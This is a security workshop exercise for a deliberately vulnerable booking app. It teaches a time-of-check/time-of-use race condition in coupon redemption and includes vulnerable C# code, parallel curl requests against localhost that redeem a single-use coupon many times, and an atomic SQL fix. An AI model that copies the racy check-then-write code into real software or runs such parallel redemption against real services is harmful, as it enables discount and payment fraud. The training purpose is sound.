# Exercise 06 — Race Conditions: Coupon Redemption

**Difficulty:** Intermediate  
**Category:** Race Conditions / TOCTOU  
**OWASP Top 10:** API4:2023 — Unrestricted Resource Consumption / A04:2021 — Insecure Design  
**Config flag:** `BookingDojo:Workshop:CouponRedemptionRaceCondition`

---

## Scenario

The coupon redemption endpoint (`POST /api/coupons/redeem`) enforces a per-coupon `MaxUses` limit by reading the current use count, checking it, waiting slightly, then writing the increment back. Because the check and the write are two separate operations with a gap between them, two concurrent requests can both pass the check before either writes — allowing a single-use coupon to be redeemed multiple times.

---

## Background

A **Time of Check / Time of Use (TOCTOU)** race condition occurs when:

1. A value is read and validated (Time of Check)
2. Some time passes during which another actor can change that value
3. The system acts based on the now-stale validation result (Time of Use)

The window between check and write is the **race window**. In a web API, this window is often only milliseconds — but that is enough for concurrent requests from the same user or multiple users to all pass the check simultaneously.

Common real-world examples:
- Coupon / discount code reuse
- Referral bonus double-claim
- Gift card balance bypass
- Double-spend in payment flows
- Inventory over-sell (booking a sold-out seat)

---

## Setup

```bash
docker compose up -d
dotnet run --project src/BookingDojo.Api -- --seed-and-exit
dotnet run --project src/BookingDojo.Api &
dotnet run --project src/BookingDojo.Bff &
cd src/bookingdojo-ui && npm run dev &
```

In `src/BookingDojo.Api/appsettings.json`, confirm the flag is Vulnerable:

```json
"Workshop": {
  "CouponRedemptionRaceCondition": "Vulnerable"
}
```

The database is seeded with:
| Code      | Discount | Max Uses |
|-----------|----------|----------|
| SAVE10    | 10%      | 1        |
| SUMMER20  | 20%      | 3        |

---

## Step 1 — Observe normal behaviour

Log in and try the coupon legitimately:

```bash
# Log in
curl -s -c cookies.txt -X POST http://localhost:5001/bff/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"partner","password":"Partner1234!"}' | jq .

# Redeem once — succeeds
curl -s -b cookies.txt -X POST http://localhost:5001/bff/coupons/redeem \
  -H "Content-Type: application/json" \
  -d '{"code":"SUMMER20"}' | jq .
```

Expected: `{ "discountPercent": 20, "message": "Coupon applied" }`

```bash
# Redeem until exhausted (MaxUses=3)
curl -s -b cookies.txt -X POST http://localhost:5001/bff/coupons/redeem \
  -H "Content-Type: application/json" \
  -d '{"code":"SUMMER20"}' | jq .
curl -s -b cookies.txt -X POST http://localhost:5001/bff/coupons/redeem \
  -H "Content-Type: application/json" \
  -d '{"code":"SUMMER20"}' | jq .

# Fourth attempt — fails as expected
curl -s -b cookies.txt -X POST http://localhost:5001/bff/coupons/redeem \
  -H "Content-Type: application/json" \
  -d '{"code":"SUMMER20"}' | jq .
```

Expected on the fourth call: `409 Conflict` — `"Coupon already exhausted"`.

---

## Step 2 — Understand the vulnerable code

```csharp
// WORKSHOP: VULNERABLE PATH (TOCTOU)
// Time of Check
var coupon = await _db.Coupons.FirstOrDefaultAsync(c => c.Code == request.Code);
if (coupon.UsesCount >= coupon.MaxUses)
    return Conflict(...);

// Race window — artificial 500 ms delay
await Task.Delay(500);

// Time of Use — stale data may have already been overwritten by another request
coupon.UsesCount++;
await _db.SaveChangesAsync();
```

The 500 ms delay is artificial and exists to make the race window exploitable in a workshop setting. In production code, the window is typically 1–10 ms — enough for concurrent HTTP requests to both pass the check.

---

## Step 3 — Exploit the race condition

Re-seed the database (or re-run with the original SAVE10 coupon, MaxUses=1).

Send two requests simultaneously. Use `&` to background both before `wait`:

```bash
# Both requests land while the other is sleeping — both pass the check
curl -s -b cookies.txt -X POST http://localhost:5001/bff/coupons/redeem \
  -H "Content-Type: application/json" \
  -d '{"code":"SAVE10"}' | jq . &

curl -s -b cookies.txt -X POST http://localhost:5001/bff/coupons/redeem \
  -H "Content-Type: application/json" \
  -d '{"code":"SAVE10"}' | jq . &

wait
```

Expected (both succeed): two `200 OK` responses with `"discountPercent": 10`, even though `MaxUses = 1`.

Verify that `UsesCount` now exceeds `MaxUses`:

```bash
# A third call still returns 409 because UsesCount (2) >= MaxUses (1)
curl -s -b cookies.txt -X POST http://localhost:5001/bff/coupons/redeem \
  -H "Content-Type: application/json" \
  -d '{"code":"SAVE10"}' | jq .
```

---

## Step 4 — Scale the attack

With more parallelism the impact is clearer:

```bash
# 10 concurrent redemptions of a coupon with MaxUses=1
for i in $(seq 1 10); do
  curl -s -b cookies.txt -X POST http://localhost:5001/bff/coupons/redeem \
    -H "Content-Type: application/json" \
    -d '{"code":"SAVE10"}' | jq -r '.message // .message' &
done
wait
```

Multiple "Coupon applied" responses confirm the limit was bypassed.

---

## Step 5 — Apply the fix

In `appsettings.json`:

```json
"CouponRedemptionRaceCondition": "Fixed"
```

Restart the API, re-seed, and repeat the parallel attack:

```bash
dotnet run --project src/BookingDojo.Api -- --seed-and-exit
dotnet run --project src/BookingDojo.Api &

curl -s -b cookies.txt -X POST http://localhost:5001/bff/coupons/redeem \
  -H "Content-Type: application/json" \
  -d '{"code":"SAVE10"}' | jq . &

curl -s -b cookies.txt -X POST http://localhost:5001/bff/coupons/redeem \
  -H "Content-Type: application/json" \
  -d '{"code":"SAVE10"}' | jq . &

wait
```

Expected: exactly one `200 OK` and one `409 Conflict`.

The fixed code:

```sql
UPDATE bookingdojo."Coupons"
SET "UsesCount" = "UsesCount" + 1
WHERE "Code" = @code AND "UsesCount" < "MaxUses"
```

The database evaluates the `WHERE` condition and performs the increment atomically within a single statement. Both concurrent requests race to run this statement, but only the one that gets there first satisfies `UsesCount < MaxUses`; the other sees 0 rows affected and receives a 409.

---

## Step 6 — Discussion

| Control | Description | Applied here |
|---------|-------------|--------------|
| Atomic UPDATE with WHERE | Check and write in one DB statement | ✓ |
| Optimistic concurrency (row version) | Retry on conflict; reject stale writes | Alternative |
| Pessimistic locking (SELECT FOR UPDATE) | Holds a row lock during check-then-write | Alternative |
| Distributed lock (Redis, DB advisory) | Prevents concurrent execution at app level | Over-engineered for this case |
| Idempotency keys | Client supplies a unique request ID; duplicates rejected | Complementary |

**Why the atomic UPDATE wins here**

- No extra round-trips: single SQL statement, no lock acquisition overhead
- Database enforces the constraint — nothing in application code can accidentally bypass it
- Works under horizontal scaling (multiple API instances share one database)
- Naturally handles the "coupon not found" case by returning 0 rows

**Why optimistic concurrency also works**

EF Core `[Timestamp]` / `RowVersion` causes `SaveChangesAsync` to throw `DbUpdateConcurrencyException` when a row was modified between read and write. Callers catch the exception and return 409. The downside: requires a retry-or-abort decision at the application layer.

**Why `SELECT FOR UPDATE` is usually worse**

Row-level locks held for the duration of the check-then-write block other readers on the same coupon, reducing throughput. The atomic UPDATE is lock-free from the application's perspective.

---

## Key Takeaways

- **TOCTOU is not a theoretical risk.** A 500 ms window is artificial; 5 ms is realistic. Concurrent HTTP requests from the same client can exploit even tiny windows.
- **Reads do not reserve state.** Reading `UsesCount = 0` does not mean another request cannot read the same value before your write lands.
- **The fix lives in the database, not the application.** Application-level locks (mutexes, semaphores) only protect a single process; they fail silently under horizontal scaling.
- **Atomic SQL is the simplest correct solution** for bounded-use resources: check and act in one statement.

---

## Further Reading

- [OWASP API4:2023 — Unrestricted Resource Consumption](https://owasp.org/API-Security/editions/2023/en/0xa4-unrestricted-resource-consumption/)
- [OWASP Race Condition](https://owasp.org/www-community/vulnerabilities/Race_Condition)
- [CWE-362: Concurrent Execution Using Shared Resource with Improper Synchronization](https://cwe.mitre.org/data/definitions/362.html)
- [EF Core Optimistic Concurrency](https://learn.microsoft.com/en-us/ef/core/saving/concurrency)
- [PostgreSQL Locking](https://www.postgresql.org/docs/current/explicit-locking.html)
